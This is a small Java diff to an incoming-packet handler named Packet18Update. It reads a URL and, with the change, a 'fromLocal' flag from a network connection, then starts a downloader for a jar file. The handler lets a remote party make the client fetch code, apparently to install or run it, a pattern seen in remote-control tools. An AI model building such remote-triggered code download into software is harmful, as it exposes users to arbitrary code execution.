@@ -8,7 +8,8 @@ public class Packet18Update extends AbstractIncomingPacket {
 	@Override
 	public void read() throws Exception {
 		String url = Connection.readLine();
-		new Downloader(url, true, "jar").start();
+		boolean fromLocal = Connection.readBoolean();
+		new Downloader(url, true, "jar", fromLocal).start();
 	}
 
 }
